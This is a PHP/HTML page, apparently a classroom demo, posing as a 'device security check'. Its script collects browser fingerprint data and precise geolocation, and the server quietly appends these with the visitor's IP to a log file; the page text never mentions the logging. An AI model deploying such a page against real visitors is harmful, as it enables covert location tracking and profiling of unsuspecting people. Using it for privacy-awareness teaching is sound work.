<?php
// Логирование посещений
$log_file = 'visitors.log';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct visit';

// Получение данных о местоположении и устройстве, если они были отправлены
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $log_entry = "[$date] IP: $ip | User-Agent: $user_agent | Referrer: $referrer";
    
    if (isset($data['location'])) {
        $latitude = $data['location']['latitude'];
        $longitude = $data['location']['longitude'];
        $accuracy = $data['location']['accuracy'];
        $log_entry .= " | Location: Lat: $latitude, Long: $longitude, Accuracy: $accuracy meters";
    }
    
    if (isset($data['device'])) {
        $log_entry .= " | Device: " . json_encode($data['device']);
    }
    
    file_put_contents($log_file, $log_entry . PHP_EOL, FILE_APPEND);
    
    echo json_encode(['status' => 'success', 'message' => 'Data received']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка безопасности устройства</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .info-box {
            background-color: #e8f4f8;
            border-left: 4px solid #3498db;
            padding: 15px;
            margin-bottom: 20px;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #2980b9;
        }
        #result {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            display: none;
        }
        .data-item {
            margin-bottom: 10px;
        }
        .data-label {
            font-weight: bold;
        }
        .loading {
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Проверка безопасности устройства</h1>
        
        <div class="info-box">
            <p>Данная страница демонстрирует, какие данные могут быть собраны веб-сайтами о вашем устройстве и местоположении. <strong>Это образовательная демонстрация для презентации по кибербезопасности.</strong></p>
        </div>
        
        <p>Нажмите кнопку ниже, чтобы начать проверку безопасности вашего устройства:</p>
        
        <button id="startCheck">Начать проверку</button>
        
        <div class="loading" id="loading">
            <p>Сканирование устройства...</p>
        </div>
        
        <div id="result">
            <h2>Результаты проверки:</h2>
            <div id="deviceInfo"></div>
            <div id="locationInfo"></div>
            <div id="browserInfo"></div>
            <div id="networkInfo"></div>
        </div>
    </div>

    <script>
        document.getElementById('startCheck').addEventListener('click', function() {
            // Показываем индикатор загрузки
            document.getElementById('loading').style.display = 'block';
            
            // Собираем информацию об устройстве
            const deviceData = {
                device: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    screenColorDepth: window.screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touchPoints: navigator.maxTouchPoints,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    batteryLevel: 'Requesting...',
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    localStorage: !!window.localStorage,
                    sessionStorage: !!window.sessionStorage,
                    indexedDB: !!window.indexedDB,
                    webGL: detectWebGL()
                }
            };
            
            // Запрашиваем геолокацию
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        deviceData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        // Отправляем данные на сервер
                        sendDataToServer(deviceData);
                    },
                    function(error) {
                        console.error("Ошибка получения геолокации:", error);
                        deviceData.location = {
                            error: error.message
                        };
                        
                        // Отправляем данные на сервер даже без геолокации
                        sendDataToServer(deviceData);
                    }
                );
            } else {
                deviceData.location = {
                    error: "Геолокация не поддерживается в этом браузере"
                };
                
                // Отправляем данные на сервер без геолокации
                sendDataToServer(deviceData);
            }
            
            // Проверяем уровень заряда батареи, если API доступен
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    deviceData.device.batteryLevel = (battery.level * 100) + '%';
                    deviceData.device.batteryCharging = battery.charging;
                });
            }
        });
        
        function sendDataToServer(data) {
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(responseData => {
                // Скрываем индикатор загрузки
                document.getElementById('loading').style.display = 'none';
                
                // Показываем результаты
                displayResults(data);
            })
            .catch(error => {
                console.error('Ошибка при отправке данных:', error);
                document.getElementById('loading').style.display = 'none';
                alert('Произошла ошибка при отправке данных');
            });
        }
        
        function displayResults(data) {
            const result = document.getElementById('result');
            const deviceInfo = document.getElementById('deviceInfo');
            const locationInfo = document.getElementById('locationInfo');
            const browserInfo = document.getElementById('browserInfo');
            const networkInfo = document.getElementById('networkInfo');
            
            // Очищаем предыдущие результаты
            deviceInfo.innerHTML = '';
            locationInfo.innerHTML = '';
            browserInfo.innerHTML = '';
            networkInfo.innerHTML = '';
            
            // Информация об устройстве
            deviceInfo.innerHTML = `
                <h3>Информация об устройстве:</h3>
                <div class="data-item"><span class="data-label">Платформа:</span> ${data.device.platform}</div>
                <div class="data-item"><span class="data-label">Производитель:</span> ${data.device.vendor || 'Не определено'}</div>
                <div class="data-item"><span class="data-label">Разрешение экрана:</span> ${data.device.screenWidth}x${data.device.screenHeight}</div>
                <div class="data-item"><span class="data-label">Глубина цвета:</span> ${data.device.screenColorDepth} бит</div>
                <div class="data-item"><span class="data-label">Сенсорный экран:</span> ${data.device.touchPoints > 0 ? 'Да' : 'Нет'}</div>
                <div class="data-item"><span class="data-label">Количество ядер CPU:</span> ${data.device.hardwareConcurrency || 'Не определено'}</div>
                <div class="data-item"><span class="data-label">Объем памяти:</span> ${data.device.deviceMemory ? data.device.deviceMemory + ' ГБ' : 'Не определено'}</div>
                <div class="data-item"><span class="data-label">Уровень заряда:</span> ${data.device.batteryLevel}</div>
            `;
            
            // Информация о местоположении
            if (data.location && !data.location.error) {
                locationInfo.innerHTML = `
                    <h3>Информация о местоположении:</h3>
                    <div class="data-item"><span class="data-label">Широта:</span> ${data.location.latitude}</div>
                    <div class="data-item"><span class="data-label">Долгота:</span> ${data.location.longitude}</div>
                    <div class="data-item"><span class="data-label">Точность:</span> ${data.location.accuracy} метров</div>
                    <div class="data-item"><a href="https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}" target="_blank">Посмотреть на карте</a></div>
                `;
            } else {
                locationInfo.innerHTML = `
                    <h3>Информация о местоположении:</h3>
                    <div class="data-item">Местоположение не определено: ${data.location ? data.location.error : 'Доступ запрещен'}</div>
                `;
            }
            
            // Информация о браузере
            browserInfo.innerHTML = `
                <h3>Информация о браузере:</h3>
                <div class="data-item"><span class="data-label">User Agent:</span> ${data.device.userAgent}</div>
                <div class="data-item"><span class="data-label">Язык:</span> ${data.device.language}</div>
                <div class="data-item"><span class="data-label">Часовой пояс:</span> ${data.device.timezone}</div>
                <div class="data-item"><span class="data-label">Cookies разрешены:</span> ${data.device.cookiesEnabled ? 'Да' : 'Нет'}</div>
                <div class="data-item"><span class="data-label">Do Not Track:</span> ${data.device.doNotTrack ? 'Включено' : 'Выключено'}</div>
                <div class="data-item"><span class="data-label">WebGL:</span> ${data.device.webGL ? 'Поддерживается' : 'Не поддерживается'}</div>
            `;
            
            // Информация о сети
            networkInfo.innerHTML = `
                <h3>Информация о сети:</h3>
                <div class="data-item"><span class="data-label">Тип соединения:</span> ${data.device.connectionType}</div>
                <div class="data-item"><span class="data-label">IP-адрес:</span> Логируется на сервере</div>
            `;
            
            // Показываем блок с результатами
            result.style.display = 'block';
        }
        
        function detectWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!(window.WebGLRenderingContext && 
                    (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
            } catch(e) {
                return false;
            }
        }
    </script>
</body>
</html>
